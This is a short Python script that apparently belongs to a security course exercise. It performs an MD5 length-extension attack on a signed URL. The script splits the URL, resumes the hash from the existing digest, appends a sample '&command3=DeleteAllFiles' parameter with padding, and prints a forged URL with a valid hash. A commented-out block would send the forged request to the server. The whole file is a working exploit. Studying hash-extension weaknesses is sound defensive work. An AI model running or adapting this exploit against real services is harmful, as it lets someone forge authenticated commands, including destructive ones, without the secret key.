import httplib, urlparse, sys, urllib
from pymd5 import md5, padding

url = sys.argv[1]

#split url
prehash = url[:url.find("=")+1]
curhash = url[url.find("=")+1:url.find("&")]
msg = url[url.find("&")+1:]

print("Pre hash url: "+prehash)
print("Current hash: "+curhash)
print("Message string (without leading &): "+msg)

mlen = len(msg)+8 #assumes an 8 bit character password
bits = (mlen + len(padding(mlen*8)))*8
print("Message length in bits w/ secret key: ")
print(bits)

#establish new initialization vector and append command
h = md5(state=curhash.decode("hex"), count=bits)
x = "&command3=DeleteAllFiles" #sample appended command
h.update(x)

#generate new hash and url
newhash = h.hexdigest()
padding = urllib.quote(padding(mlen*8))
print("Padding found at end of original instructions: "+padding)
msg = msg + padding + x

print("New hash to be inserted: "+newhash)

url = prehash+newhash+"&"+msg

print("New url is: ")
print(url)

#DO NOT USE WITHOUT PERMISSION
'''
print("Trying new url. Server output below: ")

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
'''

